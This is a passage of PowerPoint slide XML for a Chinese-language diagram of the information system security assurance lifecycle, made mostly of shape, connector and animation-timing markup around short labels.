            <a:ext cx="1224136" cy="576064"/>
          </a:xfrm>
          <a:prstGeom prst="chevr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solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>放弃</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="流程图: 过程 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="308992" y="4581128"/>
            <a:ext cx="7042568" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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dirty="0"/>
              <a:t>信息系统安全保障</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>（信息系统技术、管理、工程和人员保障要素）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="直接箭头连接符 20"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="11" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813368" y="3717032"/>
            <a:ext cx="14216" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="571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2245972" y="3717032"/>
            <a:ext cx="14216" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="571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3895496" y="3708891"/>
            <a:ext cx="14216" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="571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5465456" y="3717032"/>
            <a:ext cx="14216" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="571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6782476" y="3717032"/>
            <a:ext cx="14216" cy="864096"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="571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流程图: 过程 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3427444" y="1926717"/>
            <a:ext cx="936104" cy="576064"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartProcess">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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>变更</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="29" name="直接连接符 28"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="27" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4363548" y="2204864"/>
            <a:ext cx="1000540" cy="988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4" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5349872" y="2204864"/>
            <a:ext cx="14216" cy="93610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7" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="827584" y="2204864"/>
            <a:ext cx="2599860" cy="988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endCxn id="11" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="813368" y="2204864"/>
            <a:ext cx="0" cy="93610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2289296" y="2214749"/>
            <a:ext cx="0" cy="93610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标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="807581"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息系统安全保障生命周期</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="文本框 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524328" y="3062560"/>
            <a:ext cx="1296144" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息系统生命周期</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="文本框 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524328" y="4725144"/>
            <a:ext cx="1296144" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              </a:rPr>
              <a:t>保障要素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2397473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250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="14" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="750"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="15" presetID="2" presetClass="entr" presetSubtype="4"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250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>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4"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250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="24" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1250"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="25" presetID="2" presetClass="entr" presetSubtype="4"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250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="28" dur="250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="29" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="30" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="39"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="32" dur="250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="39"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="33" dur="25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ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>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additive="base">
                                        <p:cTn id="42" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="21"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="21"/>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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="50" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="51" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24"/>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25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="54" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="55" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="58" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="59" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26"/>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40"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="62" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="40"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="63"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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="68" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="69" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="70" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="71" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="29"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="72" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="73" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="29"/>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31"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="76" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="77" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="31"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="78" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="79" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="34"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="80" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="81" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="82" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="83" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="36"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="84" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="36"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="85" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="36"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="86" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="87" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="37"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="88" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="37"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
